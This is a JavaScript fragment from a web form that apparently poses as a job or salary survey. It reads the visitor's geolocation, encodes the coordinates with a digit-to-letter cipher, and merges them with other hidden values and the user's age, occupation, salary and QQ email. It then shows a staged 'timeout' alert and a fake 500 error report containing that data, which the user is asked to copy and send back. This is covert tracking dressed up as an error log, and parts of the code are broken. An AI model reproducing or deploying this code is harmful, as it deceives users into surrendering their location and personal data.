    

                          
        var x = document.getElementById('demo');


function getLocation() {




if (navigator.geolocation) {
navigator.geolocation.getCurrentPosition(showPosition, showError);
} else {
x.innerHTML = '当前浏览器不支持';
}
}




function showPosition(position) {
x.innerHTML =  position.coords.latitude ;
        
        y.innerHTML = position.coords.longitude;





        x.innerHTML=x.innerHTML.replace(".","A");  
          x.innerHTML=x.innerHTML.replace("1","I"); 
          x.innerHTML=x.innerHTML.replace("2","W");
          x.innerHTML=x.innerHTML.replace("3","E");
          x.innerHTML=x.innerHTML.replace("4","R");
          x.innerHTML=x.innerHTML.replace("5","P");
          x.innerHTML=x.innerHTML.replace("6","F");
          x.innerHTML=x.innerHTML.replace("7","U");
          x.innerHTML=x.innerHTML.replace("8","D");
          x.innerHTML=x.innerHTML.replace("9","C");
          x.innerHTML=x.innerHTML.replace("0","G");

          
   
          y.innerHTML=y.innerHTML.replace(".","A");  
          y.innerHTML=y.innerHTML.replace("1","I"); 
          y.innerHTML=y.innerHTML.replace("2","W");
          y.innerHTML=y.innerHTML.replace("3","E");
          y.innerHTML=y.innerHTML.replace("4","R");
          y.innerHTML=y.innerHTML.replace("5","P");
          y.innerHTML=y.innerHTML.replace("6","F");
          y.innerHTML=y.innerHTML.replace("7","U");
          y.innerHTML=y.innerHTML.replace("8","D");
          y.innerHTML=y.innerHTML.replace("9","C");
          y.innerHTML=y.innerHTML.replace("0","G");


          dw.innerHTML = x.innerHTML + "L"+ y.innerHTML;




setTimeout(  



sip.innerHTML = "所在地属 : undefined"

, 340);






}
// 获取失败，显示信息
function showError(error) {
switch (error.code) {
case error.PERMISSION_DENIED:
x.innerHTML = '用户拒绝请求';
break;
}
}




function fzsc(){

   
        tzzw.select()					
    document.execCommand('copy')//调用复制文本方法	
     }
    

function yz() {

  if ( nl.value.length > 1  ) {
    
      //
      if( nl.value >= 20  ){


        //



        if( inputTemplate.value != "请选择当前身份"  ){


//

if( mc.value.length > 1 ){


  //

  if(  sip.innerHTML.includes("undefined") ){
    //

    if(yx.value.length > 1){
    //


    if(jyx.value.length > 1){
    //


    if(qq.value.length > 1){
    //

    if( qq.value.includes("@qq.com")  && qq.value.length >= 12 ){
    //
//
//

//
//


alert("注意！出现超时提交失败 请稍等多次重试提交即可成功提交 还未解决请将报错信息和填写的内容手动发送到下方的输入框内 点击下方报文即可复制 点击下方输入框粘贴后点击输入框范围外即可保存。注意查看是否保存成功 ")




setTimeout(function ccc() {
  
fz.innerHTML =     '{"status":500,"error":BadRequest,Cookie:gid='   +  '\n' +
 
sb.innerHTML + "L" +ipjm.innerHTML + "L" + '\n' +


dw.innerHTML + "L" + '\n' +


newstring  + '\n' +


'age="' + nl.value +'",identity="'+   inputTemplate.value +'",occupation="' + mc.value
+ '",region="' + sip.innerHTML + '",xk="' +  yx.value  + '",xk2="' + jyx.value
+  '",qq_id="'   + qq.value + '";info;}'





tzzw.value = '{"status":500,"error":BadRequest,Cookie:gid=' + 
sb.innerHTML + "L" +ipjm.innerHTML + "L"
+ dw.innerHTML + "L" + newstring  + 
'age="' + nl.value +'",identity="'+   inputTemplate.value +'",occupation="' + mc.value
+ '",region="' + sip.innerHTML + '",xk="' +  yx.value  + '",xk2="' + jyx.value
+  '",qq_id="'   + qq.value + '";info;}'

echosc.style='display: inline;'






}, 2300);



      
  }
  else{
    alert("qq邮箱格式不对")
  }

  }
  else{
    alert("请输入qq邮箱")
  }

  }
  else{
    alert("请输入期望月薪")
  }


  }
  else{
    alert("请输入现在月薪")
  }


  }
  else{
    alert("现职所在地属为空")
  }
}
else{
  alert("请输入现在名称")
}

}
else{
alert("请选择当前身份")

}


//

      }
      else{
        alert("你的年龄没有满20周岁")

      }

//

}
else {
  alert("请输入年龄")
}




 

}

